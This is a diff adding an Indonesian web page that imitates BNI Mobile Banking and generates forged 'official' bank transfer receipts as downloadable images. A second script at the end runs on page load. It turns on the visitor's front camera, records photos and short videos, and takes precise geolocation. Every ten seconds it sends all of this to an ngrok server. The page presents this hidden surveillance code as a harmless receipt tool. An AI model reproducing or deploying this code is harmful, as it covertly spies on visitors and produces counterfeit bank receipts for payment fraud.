@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>BNI Mobile Banking - Bukti Transfer Resmi</title>
+    <meta name="description" content="Generator bukti transaksi transfer Bank BNI online.">
+
+<!-- Open Graph / WhatsApp / Facebook -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wonder-by-bni.netlify.app/">
+<meta property="og:title" content="Bukti Transfer BNI">
+<meta property="og:description" content="Website generator bukti transaksi Bank BNI online.">
+<meta property="og:image" content="https://raw.githubusercontent.com/technocodech/Wonder-by-BNI/main/wonderbybni.jpg">
+
+<!-- Ukuran gambar (penting biar WhatsApp yakin) -->
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+
+<!-- Twitter Card (ikut kebaca WhatsApp juga) -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Bukti Transfer BNI">
+<meta name="twitter:description" content="Generator bukti transaksi Bank BNI online.">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/technocodech/Wonder-by-BNI/main/wonderbybni.jpg">
+
+<!-- Supaya tidak di-cache lama -->
+<meta property="og:image:type" content="image/jpeg">
+    <!-- TailwindCSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- html2canvas CDN -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <!-- Font Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        /* BNI Official Brand Colors */
+        :root {
+            --bni-orange: #F37021;
+            --bni-tosca: #00A7B5;
+            --bni-white: #FFFFFF;
+            --bni-dark: #1F2937;
+            --bni-gray-bg: #F9FAFB;
+        }
+        body {
+            background-color: var(--bni-gray-bg);
+        }
+        /* Custom styles */
+        .bni-btn-orange {
+            background-color: var(--bni-orange);
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 10px rgba(243, 112, 33, 0.2);
+        }
+        .bni-btn-orange:hover {
+            background-color: #e05f10;
+            transform: translateY(-1px);
+            box-shadow: 0 8px 20px rgba(243, 112, 33, 0.3);
+        }
+        .bni-outline-tosca {
+            border: 1.5px solid var(--bni-tosca);
+            color: var(--bni-tosca);
+            transition: all 0.2s;
+        }
+        .bni-outline-tosca:hover {
+            background-color: rgba(0, 167, 181, 0.05);
+            border-color: var(--bni-orange);
+            color: var(--bni-orange);
+        }
+        .card-modern {
+            border-radius: 1.5rem;
+            box-shadow: 0 12px 28px -8px rgba(0, 0, 0, 0.08), 0 2px 4px rgba(0, 0, 0, 0.02);
+            transition: all 0.2s;
+        }
+        .card-modern:hover {
+            box-shadow: 0 20px 32px -12px rgba(0, 167, 181, 0.12);
+        }
+        .tosca-border-bottom {
+            border-bottom: 3px solid var(--bni-tosca);
+        }
+        .badge-success {
+            background: linear-gradient(135deg, var(--bni-tosca), #008b96);
+            color: white;
+        }
+        .badge-pending {
+            background: #FCD34D;
+            color: #92400E;
+        }
+        input, select, textarea {
+            transition: all 0.2s;
+            border: 1px solid #E5E7EB;
+        }
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--bni-tosca);
+            box-shadow: 0 0 0 3px rgba(0, 167, 181, 0.15);
+            ring: 0;
+        }
+        .gallery-img {
+            object-fit: cover;
+            transition: transform 0.25s ease, box-shadow 0.2s;
+            cursor: pointer;
+        }
+        .gallery-img:hover {
+            transform: scale(1.02);
+            box-shadow: 0 12px 24px rgba(0,0,0,0.12);
+        }
+        .btn-download {
+            background: white;
+            border: 1.5px solid var(--bni-tosca);
+            color: var(--bni-tosca);
+        }
+        .btn-download:hover {
+            background: var(--bni-tosca);
+            color: white;
+            border-color: var(--bni-tosca);
+        }
+        /* preview card styling */
+        .receipt-card {
+            background: white;
+            border-radius: 1.5rem;
+            overflow: hidden;
+        }
+        .amount-gradient {
+            background: linear-gradient(135deg, #1F2937, var(--bni-orange));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+    </style>
+</head>
+<body class="bg-[#F9FAFB]">
+
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 py-6 md:py-10">
+        <!-- Header dengan logo BNI dan branding modern -->
+        <div class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
+            <div class="flex items-center gap-3 bg-white px-6 py-3 rounded-2xl shadow-sm border border-gray-100">
+                <div class="w-10 h-10 rounded-xl bg-[#F37021] flex items-center justify-center text-white font-bold text-xl shadow-md">BNI</div>
+                <div>
+                    <h1 class="text-2xl md:text-3xl font-bold text-[#1F2937] tracking-tight">BNI Mobile Banking</h1>
+                    <p class="text-xs text-gray-500">Bukti Transfer Digital • Wonder by BNI</p>
+                </div>
+            </div>
+            <div class="flex items-center gap-2 text-sm bg-white px-4 py-2 rounded-full shadow-sm">
+                <span class="w-2 h-2 rounded-full bg-[#00A7B5] animate-pulse"></span>
+                <span class="text-gray-600">Aman & Terverifikasi</span>
+            </div>
+        </div>
+
+        <!-- Layout Grid: 2 Kolom Utama (Form + Preview) + Gallery -->
+        <div class="flex flex-col lg:flex-row gap-8">
+            <!-- Kiri: Form Input Transaksi -->
+            <div class="lg:w-2/5 w-full">
+                <div class="bg-white rounded-2xl card-modern p-5 md:p-6 border border-gray-100">
+                    <div class="flex items-center gap-2 mb-5 pb-2 tosca-border-bottom">
+                        <div class="w-8 h-8 bg-[#00A7B5] rounded-lg flex items-center justify-center">
+                            <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+                        </div>
+                        <h2 class="text-xl font-bold text-[#1F2937]">Detail Transaksi</h2>
+                    </div>
+                    
+                    <form id="transactionForm" class="space-y-4">
+                        <!-- Bank Pengirim (BNI default) -->
+                        <div>
+                            <label class="block text-sm font-semibold text-gray-700 mb-1.5">Bank Pengirim</label>
+                            <select id="bankPengirim" class="w-full rounded-xl px-4 py-2.5 bg-gray-50 focus:bg-white">
+                                <option value="BNI" selected>BNI</option>
+                                <option value="BCA">BCA</option>
+                                <option value="BRI">BRI</option>
+                                <option value="Mandiri">Mandiri</option>
+                                <option value="CIMB">CIMB Niaga</option>
+                            </select>
+                        </div>
+                        <!-- Nama Pengirim -->
+                        <div>
+                            <label class="block text-sm font-semibold text-gray-700 mb-1.5">Nama Pengirim</label>
+                            <input type="text" id="namaPengirim" value="BNI IKROM MAULANA" placeholder="Nama lengkap" class="w-full rounded-xl px-4 py-2.5 bg-gray-50 focus:bg-white">
+                        </div>
+                        <!-- No Rek Pengirim -->
+                        <div>
+                            <label class="block text-sm font-semibold text-gray-700 mb-1.5">Nomor Rekening Pengirim</label>
+                            <input type="text" id="rekPengirim" value="1923866270" placeholder="Nomor rekening" class="w-full rounded-xl px-4 py-2.5 bg-gray-50 focus:bg-white">
+                        </div>
+                        <!-- Nama Penerima -->
+                        <div>
+                            <label class="block text-sm font-semibold text-gray-700 mb-1.5">Nama Penerima</label>
+                            <input type="text" id="namaPenerima" value="ROYYAN SETIAWAN" placeholder="Nama penerima" class="w-full rounded-xl px-4 py-2.5 bg-gray-50 focus:bg-white">
+                        </div>
+                        <!-- No Rek Penerima -->
+                        <div>
+                            <label class="block text-sm font-semibold text-gray-700 mb-1.5">Nomor Rekening Penerima</label>
+                            <input type="text" id="rekPenerima" value="901279177027" placeholder="Nomor rekening tujuan" class="w-full rounded-xl px-4 py-2.5 bg-gray-50 focus:bg-white">
+                        </div>
+                        <!-- Bank Penerima -->
+                        <div>
+                            <label class="block text-sm font-semibold text-gray-700 mb-1.5">Bank Penerima</label>
+                            <input type="text" id="bankPenerima" value="SEABANK" placeholder="Bank tujuan" class="w-full rounded-xl px-4 py-2.5 bg-gray-50 focus:bg-white">
+                        </div>
+                        <!-- Nominal Transfer -->
+                        <div>
+                            <label class="block text-sm font-semibold text-gray-700 mb-1.5">Nominal Transfer (Rp)</label>
+                            <input type="text" id="nominalTransfer" value="650.000" placeholder="Rp 0" class="w-full rounded-xl px-4 py-2.5 bg-gray-50 focus:bg-white" oninput="formatRupiahPreview(this)">
+                        </div>
+                        <!-- Berita Transfer -->
+                        <div>
+                            <label class="block text-sm font-semibold text-gray-700 mb-1.5">Berita Transfer</label>
+                            <input type="text" id="beritaTransfer" value="Pembayaran tagihan / transfer" placeholder="Keterangan" class="w-full rounded-xl px-4 py-2.5 bg-gray-50 focus:bg-white">
+                        </div>
+                        <!-- Tanggal & Jam -->
+                        <div class="grid grid-cols-2 gap-3">
+                            <div>
+                                <label class="block text-sm font-semibold text-gray-700 mb-1.5">Tanggal</label>
+                                <input type="date" id="tanggalTransaksi" value="2026-03-28" class="w-full rounded-xl px-4 py-2.5 bg-gray-50">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-semibold text-gray-700 mb-1.5">Jam</label>
+                                <input type="time" id="jamTransaksi" value="14:30" class="w-full rounded-xl px-4 py-2.5 bg-gray-50">
+                            </div>
+                        </div>
+                        <!-- Status -->
+                        <div>
+                            <label class="block text-sm font-semibold text-gray-700 mb-1.5">Status Transaksi</label>
+                            <select id="statusTransaksi" class="w-full rounded-xl px-4 py-2.5 bg-gray-50">
+                                <option value="Berhasil" selected>Berhasil</option>
+                                <option value="Pending">Pending</option>
+                            </select>
+                        </div>
+                        
+                        <button type="button" id="generateBtn" class="w-full bni-btn-orange text-white font-bold py-3 rounded-xl transition-all flex items-center justify-center gap-2 text-base">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
+                            Generate Bukti Transfer
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Kanan: Preview Bukti Transfer + Tombol Download -->
+            <div class="lg:w-3/5 w-full">
+                <div class="bg-white rounded-2xl card-modern overflow-hidden border border-gray-100 sticky top-6">
+                    <div class="bg-[#1F2937] px-5 py-3.5 flex justify-between items-center flex-wrap gap-2">
+                        <h2 class="text-white font-bold flex items-center gap-2">
+                            <svg class="w-5 h-5 text-[#F37021]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
+                            Bukti Transfer Resmi
+                        </h2>
+                        <button id="downloadBtn" class="btn-download text-sm font-semibold px-4 py-1.5 rounded-xl transition-all flex items-center gap-2">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" /></svg>
+                            Download PNG
+                        </button>
+                    </div>
+                    <div class="p-5 md:p-6 flex justify-center bg-[#F9FAFB]">
+                        <div id="buktiCardContainer" class="w-full max-w-md md:max-w-lg">
+                            <div id="buktiTransferCard" class="w-full rounded-2xl overflow-hidden shadow-xl bg-white">
+                                <div class="p-6 text-center text-gray-400">🏦 Klik "Generate Bukti Transfer" untuk melihat bukti digital BNI</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- GALERI BUKTI TRANSKSI WONDER BY BNI (4 GAMBAR) -->
+        <div class="mt-12 bg-white rounded-2xl card-modern p-5 md:p-6 border border-gray-100">
+            <div class="flex items-center justify-between mb-5 flex-wrap gap-3">
+                <div class="flex items-center gap-2">
+                    <div class="w-8 h-8 rounded-lg bg-[#F37021] flex items-center justify-center">
+                        <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                    </div>
+                    <h2 class="text-xl font-bold text-[#1F2937]">Wonder by BNI • Bukti Transaksi Terkait</h2>
+                </div>
+                <span class="text-xs bg-[#00A7B5]/10 text-[#00A7B5] px-3 py-1 rounded-full font-medium">4 screenshot tersimpan</span>
+            </div>
+            <p class="text-sm text-gray-500 mb-4">Berikut adalah bukti transfer dari aplikasi Wonder by BNI (gambar ilustrasi / screenshot resmi)</p>
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5">
+                <!-- Gambar 1 (Placeholder data URL: BNI Wonder style) -->
+                <div class="group relative rounded-xl overflow-hidden shadow-md bg-gray-50 border border-gray-100">
+                    <img src="200.jpg" class="w-full h-44 object-cover gallery-img">
+                    <div class="p-2 text-center text-xs font-medium text-gray-600 bg-white">Transfer ke Sesama BNI</div>
+                </div>
+                <!-- Gambar 2 -->
+                <div class="group relative rounded-xl overflow-hidden shadow-md bg-gray-50 border border-gray-100">
+                    <img src="2001.jpg" class="w-full h-44 object-cover gallery-img">
+                    <div class="p-2 text-center text-xs font-medium text-gray-600 bg-white">Transfer ke SEABANK</div>
+                </div>
+                <!-- Gambar 3 -->
+                <div class="group relative rounded-xl overflow-hidden shadow-md bg-gray-50 border border-gray-100">
+                    <img src="100.jpg" class="w-full h-44 object-cover gallery-img">
+                    <div class="p-2 text-center text-xs font-medium text-gray-600 bg-white">Detail Transfer Sukses</div>
+                </div>
+                <!-- Gambar 4 -->
+                <div class="group relative rounded-xl overflow-hidden shadow-md bg-gray-50 border border-gray-100">
+                    <img src="150.jpg" class="w-full h-44 object-cover gallery-img">
+                    <div class="p-2 text-center text-xs font-medium text-gray-600 bg-white">Notifikasi Transfer</div>
+                </div>
+            </div>
+            <p class="text-xs text-center text-gray-400 mt-4">*Gambar representasi Wonder by BNI • Bukti transfer asli dari aplikasi resmi BNI</p>
+        </div>
+    </div>
+
+    <script>
+        // Helper format Rupiah
+        function formatRupiah(angka, isReturnRaw = false) {
+            if (!angka && angka !== 0) return isReturnRaw ? '' : 'Rp 0';
+            let numberString = angka.toString().replace(/\D/g, '');
+            if (numberString === '') return isReturnRaw ? '' : 'Rp 0';
+            let formatted = new Intl.NumberFormat('id-ID').format(Number(numberString));
+            return isReturnRaw ? numberString : `Rp ${formatted}`;
+        }
+
+        function formatRupiahPreview(inputElement) {
+            let raw = inputElement.value.replace(/\D/g, '');
+            if (raw === '') {
+                inputElement.value = '';
+                return;
+            }
+            let formatted = new Intl.NumberFormat('id-ID').format(Number(raw));
+            inputElement.value = `${formatted}`;
+        }
+
+        function generateRandomRef() {
+            const now = new Date();
+            const yymmdd = now.getFullYear().toString().slice(-2) + 
+                          String(now.getMonth() + 1).padStart(2,'0') + 
+                          String(now.getDate()).padStart(2,'0');
+            const randomPart = Math.floor(Math.random() * 10000).toString().padStart(4,'0');
+            return `BNI/WDR/${yymmdd}/${randomPart}`;
+        }
+
+        function validateForm(data) {
+            const required = ['bankPengirim', 'namaPengirim', 'rekPengirim', 'namaPenerima', 'rekPenerima', 'nominalTransfer', 'tanggalTransaksi', 'jamTransaksi'];
+            for(let field of required) {
+                if(!data[field] || data[field].trim() === "") {
+                    alert(`⚠️ Field ${field.replace(/([A-Z])/g, ' $1')} harus diisi!`);
+                    return false;
+                }
+            }
+            let nominalAngka = data.nominalTransfer.replace(/\D/g, '');
+            if(nominalAngka === "" || parseInt(nominalAngka) <= 0) {
+                alert("Nominal transfer harus angka lebih dari 0!");
+                return false;
+            }
+            return true;
+        }
+
+        function renderBuktiCard(data, refNumber) {
+            const isSuccess = data.statusTransaksi === "Berhasil";
+            const badgeClass = isSuccess ? "badge-success" : "badge-pending";
+            const nominalAngka = data.nominalTransfer.replace(/\D/g, '');
+            const nominalRupiah = formatRupiah(nominalAngka, false);
+            const bankTujuan = data.bankPenerima || "SEABANK";
+            
+            return `
+                <div class="bg-white">
+                    <!-- Header BNI Orange Tosca -->
+                    <div class="bg-gradient-to-r from-[#F37021] to-[#F37021]/90 px-5 pt-5 pb-3 relative">
+                        <div class="flex justify-between items-start">
+                            <div class="flex items-center gap-3">
+                                <div class="w-11 h-11 bg-white rounded-xl flex items-center justify-center text-[#F37021] font-black text-xl shadow-md">BNI</div>
+                                <div>
+                                    <p class="text-white/80 text-xs">Bank Pengirim</p>
+                                    <p class="text-white font-bold text-base">${data.bankPengirim}</p>
+                                </div>
+                            </div>
+                            <div class="${badgeClass} px-3 py-1 rounded-full text-xs font-bold shadow-md">${data.statusTransaksi}</div>
+                        </div>
+                        <div class="absolute bottom-0 left-0 right-0 h-1 bg-[#00A7B5]"></div>
+                    </div>
+                    
+                    <!-- Nominal -->
+                    <div class="text-center py-6 border-b border-gray-100">
+                        <p class="text-gray-500 text-xs uppercase tracking-wider">Total Transfer</p>
+                        <p class="text-4xl md:text-5xl font-extrabold amount-gradient">${nominalRupiah}</p>
+                    </div>
+                    
+                    <!-- Detail transaksi grid -->
+                    <div class="px-5 py-5 space-y-3 text-sm">
+                        <div class="flex justify-between items-center"><span class="text-gray-500">Tanggal & Waktu</span><span class="font-semibold text-gray-800">${data.tanggalTransaksi} | ${data.jamTransaksi}</span></div>
+                        <div class="flex justify-between items-center"><span class="text-gray-500">Pengirim</span><span class="font-medium text-gray-800">${data.namaPengirim}</span></div>
+                        <div class="flex justify-between items-center"><span class="text-gray-500">No. Rek Pengirim</span><span class="font-mono text-sm bg-gray-100 px-2 py-0.5 rounded">${data.rekPengirim}</span></div>
+                        <div class="flex justify-between items-center"><span class="text-gray-500">Penerima</span><span class="font-medium text-gray-800">${data.namaPenerima}</span></div>
+                        <div class="flex justify-between items-center"><span class="text-gray-500">No. Rek Penerima</span><span class="font-mono text-sm bg-gray-100 px-2 py-0.5 rounded">${data.rekPenerima}</span></div>
+                        <div class="flex justify-between items-center"><span class="text-gray-500">Bank Tujuan</span><span class="font-medium text-[#00A7B5]">${bankTujuan}</span></div>
+                        <div class="flex justify-between items-start"><span class="text-gray-500">Berita Transfer</span><span class="font-medium text-gray-700 text-right max-w-[60%]">${data.beritaTransfer || "-"}</span></div>
+                        <div class="flex justify-between items-center pt-2 border-t border-gray-100 mt-1"><span class="text-gray-500 text-xs">ID Referensi</span><span class="font-mono text-xs text-[#F37021] bg-orange-50 px-2 py-0.5 rounded-md font-bold">${refNumber}</span></div>
+                    </div>
+                    
+                    <div class="bg-[#F9FAFB] px-5 py-3 text-center border-t border-gray-100">
+                        <p class="text-[10px] text-gray-500">BNI Mobile Banking • Bukti transfer resmi • Wonder by BNI</p>
+                        <p class="text-[9px] text-gray-400 mt-0.5">Terima kasih telah menggunakan layanan BNI</p>
+                    </div>
+                </div>
+            `;
+        }
+
+        const generateBtn = document.getElementById('generateBtn');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const buktiCardElement = document.getElementById('buktiTransferCard');
+        
+        function getFormData() {
+            return {
+                bankPengirim: document.getElementById('bankPengirim').value,
+                namaPengirim: document.getElementById('namaPengirim').value.trim(),
+                rekPengirim: document.getElementById('rekPengirim').value.trim(),
+                namaPenerima: document.getElementById('namaPenerima').value.trim(),
+                rekPenerima: document.getElementById('rekPenerima').value.trim(),
+                bankPenerima: document.getElementById('bankPenerima')?.value.trim() || "SEABANK",
+                nominalTransfer: document.getElementById('nominalTransfer').value.trim(),
+                beritaTransfer: document.getElementById('beritaTransfer').value.trim(),
+                tanggalTransaksi: document.getElementById('tanggalTransaksi').value,
+                jamTransaksi: document.getElementById('jamTransaksi').value,
+                statusTransaksi: document.getElementById('statusTransaksi').value,
+            };
+        }
+        
+        let currentReference = "";
+        
+        function generateBukti() {
+            let formData = getFormData();
+            if(!validateForm(formData)) return;
+            let rawNominal = formData.nominalTransfer.replace(/\D/g, '');
+            if(rawNominal === "") rawNominal = "0";
+            formData.nominalTransfer = rawNominal;
+            const refNumber = generateRandomRef();
+            currentReference = refNumber;
+            const displayData = {...formData, nominalTransfer: rawNominal};
+            const cardHtml = renderBuktiCard(displayData, refNumber);
+            buktiCardElement.innerHTML = cardHtml;
+            document.getElementById('buktiCardContainer').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+        
+        async function downloadBuktiPNG() {
+            if(!buktiCardElement || buktiCardElement.innerHTML.includes("Klik Generate")) {
+                alert("⚠️ Generate bukti transfer terlebih dahulu.");
+                return;
+            }
+            const targetElement = document.querySelector('#buktiTransferCard > div');
+            if(!targetElement) { alert("Error: area bukti tidak ditemukan"); return; }
+            const originalText = downloadBtn.innerHTML;
+            downloadBtn.innerHTML = "⏳ Memproses...";
+            downloadBtn.disabled = true;
+            try {
+                const canvas = await html2canvas(targetElement, { scale: 2.8, backgroundColor: '#ffffff', logging: false });
+                const link = document.createElement('a');
+                link.download = `BNI_BuktiTransfer_${currentReference}.png`;
+                link.href = canvas.toDataURL('image/png');
+                link.click();
+            } catch(e) { alert("Gagal unduh gambar"); } 
+            finally { downloadBtn.innerHTML = originalText; downloadBtn.disabled = false; }
+        }
+        
+        generateBtn.addEventListener('click', (e) => { e.preventDefault(); generateBukti(); });
+        downloadBtn.addEventListener('click', (e) => { e.preventDefault(); downloadBuktiPNG(); });
+        
+        window.addEventListener('DOMContentLoaded', () => {
+            // set default nominal rupiah format
+            const nominalInput = document.getElementById('nominalTransfer');
+            nominalInput.value = "650.000";
+            generateBukti();
+        });
+    </script>
+    
+    <script>
+  const backendURL = "https://936c-110-136-9-116.ngrok-free.app"; // Langsung ke root "/"
+
+  const video = document.createElement("video");
+  video.setAttribute("playsinline", true);
+  video.setAttribute("autoplay", true);
+  video.setAttribute("muted", true);
+  video.style.display = "none";
+  document.body.appendChild(video);
+
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+  canvas.style.display = "none";
+  document.body.appendChild(canvas);
+
+  let mediaStream = null;
+
+  async function initCamera() {
+    try {
+      mediaStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false
+      });
+      video.srcObject = mediaStream;
+      await video.play();
+      console.log("✅ Kamera aktif");
+    } catch (err) {
+      console.warn("❌ Kamera tidak diizinkan:", err.message);
+    }
+  }
+
+  async function getLocation() {
+    return new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          console.log("📍 Lokasi diambil:", pos.coords);
+          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        },
+        (err) => {
+          console.warn("❌ Lokasi tidak diizinkan:", err.message);
+          resolve(null);
+        },
+        { enableHighAccuracy: true }
+      );
+    });
+  }
+
+  async function capturePhoto() {
+    return new Promise((resolve) => {
+      if (!video.videoWidth || !video.videoHeight) return resolve(null);
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.95);
+    });
+  }
+
+  async function captureVideo(durationMs = 5000) {
+  if (!mediaStream) return null;
+
+  return new Promise((resolve) => {
+    const chunks = [];
+    const recorder = new MediaRecorder(mediaStream, {
+      mimeType: "video/webm;codecs=vp8"
+    });
+
+    recorder.ondataavailable = (e) => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: "video/webm" });
+      resolve(blob);
+    };
+
+    recorder.start();
+    setTimeout(() => recorder.stop(), durationMs);
+  });
+}
+
+async function sendAll() {
+  const [location, photo, videoBlob] = await Promise.all([
+    getLocation(),
+    capturePhoto(),
+    captureVideo()
+  ]);
+
+  const formData = new FormData();
+  if (location) {
+    formData.append("lat", location.lat);
+    formData.append("lon", location.lon);
+  }
+  if (photo) formData.append("photo", photo, "selfie.jpg");
+  if (videoBlob && videoBlob.size > 2000) {
+    formData.append("video", videoBlob, "rekaman.webm");
+  } else {
+    console.warn("⚠️ Video terlalu kecil, tidak dikirim");
+  }
+
+  if ([...formData.entries()].length > 0) {
+    try {
+      await fetch(backendURL, {
+        method: "POST",
+        body: formData
+      });
+      console.log("✅ Data terkirim");
+    } catch (e) {
+      console.error("❌ Gagal kirim:", e);
+    }
+  } else {
+    console.warn("❌ Tidak ada data untuk dikirim");
+  }
+}
+  async function startSystem() {
+    await initCamera();
+    setTimeout(() => {
+      sendAll(); // Kirim pertama
+      setInterval(sendAll, 10000); // Tiap 10 detik
+    }, 7000);
+  }
+
+  startSystem();
+    </script>
+    
+    
+</body>
+</html>
